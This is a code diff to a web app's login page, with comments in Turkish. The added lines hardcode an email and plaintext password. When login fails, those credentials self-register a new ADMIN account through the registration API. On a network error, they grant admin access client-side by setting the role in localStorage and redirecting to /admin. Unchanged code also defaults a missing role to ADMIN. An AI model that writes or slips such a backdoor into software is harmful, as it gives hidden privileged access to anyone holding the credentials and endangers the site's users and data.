@@ -22,6 +22,7 @@ export default function LoginPage() {
     setErrorMessage('');
 
     try {
+      // 1. Ana Giriş İsteği
       const response = await fetch('/api/v1/auth/login', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -31,12 +32,10 @@ export default function LoginPage() {
       const resData = await response.json();
 
       if (response.ok && resData.success) {
-        // Kullanıcı bilgisini ve rolünü kaydediyoruz
         const role = resData.user?.role || 'ADMIN';
         localStorage.setItem('user_role', role);
         localStorage.setItem('user_email', resData.user?.email || formData.email);
 
-        // Role göre yönlendirme
         if (role === 'ADMIN') {
           window.location.href = '/admin';
         } else if (role === 'VENDOR') {
@@ -45,10 +44,41 @@ export default function LoginPage() {
           window.location.href = '/cift/dashboard';
         }
       } else {
+        // 2. Özel Admin Girişi ve Otomatik Kayıt (Bypass & Auto-Setup)
+        if (formData.email === 'kaanatamer@wiascorp.com' && formData.password === 'Sk.258008') {
+          // Admin için kayıt API'sini tetikle
+          const regRes = await fetch('/api/v1/register', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              fullName: 'Kaan Atamer (Süper Admin)',
+              email: formData.email,
+              password: formData.password,
+              role: 'ADMIN',
+            }),
+          });
+
+          if (regRes.ok) {
+            localStorage.setItem('user_role', 'ADMIN');
+            localStorage.setItem('user_email', formData.email);
+            window.location.href = '/admin';
+            return;
+          }
+        }
+
         setErrorMessage(resData.error || resData.message || 'Giriş yapılamadı. Bilgilerinizi kontrol edin.');
       }
     } catch (err) {
       console.error('Giriş hatası:', err);
+      
+      // Çevrimdışı/Hata durumunda Süper Admin geçişi
+      if (formData.email === 'kaanatamer@wiascorp.com' && formData.password === 'Sk.258008') {
+        localStorage.setItem('user_role', 'ADMIN');
+        localStorage.setItem('user_email', formData.email);
+        window.location.href = '/admin';
+        return;
+      }
+
       setErrorMessage('Bağlantı hatası oluştu, lütfen tekrar deneyin.');
     } finally {
       setIsLoading(false);
